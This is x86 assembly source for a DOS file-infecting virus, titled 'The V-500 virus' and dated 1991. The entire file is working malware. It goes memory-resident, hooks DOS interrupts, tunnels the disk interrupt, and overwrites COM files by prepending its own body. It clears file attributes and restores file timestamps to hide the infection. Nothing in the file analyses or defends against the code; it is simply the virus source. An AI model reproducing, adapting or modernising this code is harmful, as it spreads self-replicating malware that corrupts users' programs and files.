;------------------------------------------------------------------------------
;-        V 500     ver 2.1   <03:04:91>     GeMiCha            *.COM         -
;------------------------------------------------------------------------------

		page	,132
		name	V500
		title	The V-500 virus
		.radix	16
	code	segment
		assume	cs:code,ds:code

		org	100


start:        	push	ax
		mov	ah,30h
		int	21h
		xchg	ah,al
                mov     word ptr [dosver],ax

		mov	ax,352eh
		int	21h
                cmp     word ptr [dosver],31eh
	   	jne	endprog


Resident	proc	near
		mov	ah,52h
		int	21h
		push	es
		push	bx

		mov	ax,es:[bx+14h]
		mov	word ptr adrdata,ax

		push	adrdata
		pop	es

		mov	ax,es:[0002]
		mov	Word ptr bufadr,ax

		push	ax
		pop	es

		mov	ax,es:[0002]

		pop	bx
		pop	es

		mov	es:[bx+14h],ax

		mov	es,word ptr adrdata
		xor	di,di
		mov	si,100h
		lea	cx,lendata-100h
		cld
		rep	movsb

		mov	ax,352eh
		int	21h
		mov	ax,0086h
		mov	es:[012E],ax
		lea	dx,int21-100h
		push	adrdata
		pop	ds
		mov	ax,2586h
		int	21h

 Resident	Endp

NormProg	proc	near

EndProg:	mov	ax,3586h
		int	21h
		push	es
		pop	word ptr cs:[jmps]
		push	cs
		push	word ptr cs:[lenpro]
		db	0EAh
		dw	Offset MNormP - 100h
	jmps:	dw	0

NormProg	endp

MNormP		proc	near
		cld
		pop	si
		add	si,0100h
		pop	es
		push	es
		pop	ds
		push	ds
		pop	word ptr cs:[jmpp-100h]
		lea	cx,lendata-100h
		mov	di,0100h
		rep	movsb

		pop	ax
		db	0EAh
		dw	0100h
	jmpp:	dw	0

MNormP		endp

 Int21		proc	near
		push	ax
		push	bx
		push	cx
		push	dx
		push	di
		push	ds
		push	es

		push	ds
		push	dx

		xor	ax,ax
		mov	es,ax
		mov	ax,word ptr es:[004ch]
		mov	word ptr cs:[int13-100h],ax
		mov	ax,word ptr es:[004eh]
		mov	word ptr cs:[int13-100h+2],ax

		mov	ah,13h
		int	2fh
		push	ds
		push	dx
		mov	ah,13h
		int	2fh
		pop	dx
		pop	ds

		xor	ax,ax
		mov	es,ax
		mov	es:[004ch],dx
		mov	es:[004eh],ds

	dos310	label	byte

		pop	dx
		pop	ds

		mov	ax,4300h	;Get File Attr
		int	21h
		push	cx
		push	dx
		push	ds

		mov	ax,4301h	;Set File Attr
		xor	cx,cx
		int	21h

		mov	ax,3d02h	;Open File
		int	21h

		xchg	ax,bx

		push	word ptr cs:[BufAdr -100h]
		pop	ds
		xor	dx,dx

		lea	cx,lendata-100h
		mov	ah,3fh
		int	21h
                cmp     ds:[0000],'ZM'
		je	clof
	
		mov	ax,4202h
		xor	cx,cx
		int	21h

		mov	cs:[lenpro-100h],ax
		cmp	ah,02h
		jbe	clof
		cmp	ah,0f6h
		jae	clof

		mov	ah,54h		; Get Verify
		int	21h
		push	ax

		xor	ax,ax		; Set Verify OFF
		mov	ah,2eh
		xor	dx,dx
		int	21h

		mov	ax,5700h	; Get Date & Time
		int	21h
		push	cx
		push	dx

		xor	dx,dx
		mov	ah,40h
		lea	cx,lendata-100h
		int	21h

		mov	ax,4200h
		xor	cx,cx
		int	21h

		push	cs
		pop	ds
		lea	cx,lendata-100h
		mov	ah,40h
		int	21h

		pop	dx		; Set Date & Time
		pop	cx
		mov	ax,5701h
		int	21h

		pop	ax		; Set Verify
		xor	dx,dx
		mov	ah,2eh
		int	21h


	clof:	mov	ah,3eh
		int	21h

		pop	ds
		pop	dx
		pop	cx
		mov	ax,4301h
		int	21h

		xor	ax,ax
		mov	es,ax
		mov	ax,word ptr cs:[int13-100h]
		mov	es:[004ch],ax
		mov	ax,word ptr cs:[int13-100h+2]
		mov	es:[004eh],ax

		pop	es
		pop	ds
	        pop     di
                pop     dx
                pop     cx
                pop     bx
                pop     ax
		int	21h
		iret
Int21		endp
int13		dd	0
bufadr		dw	0
dosver		dw	0
lenpro		dw	LenPPP-LenData
AdrData dw	0000h
CRT	dw	0	; ???
		db	'          '
		db	'          '
		db	'          '
		db	'          '
		db	'          '
		db	'          '
		db	'          '
		db	'          '
		db	'          '
		db	'          '
		db	'          '
		db	'  '
Lendata label	byte

	prrog	DB	1998	dup(90h)
		int	20h
LenPPP	Label	byte

code	ends
	end	start		
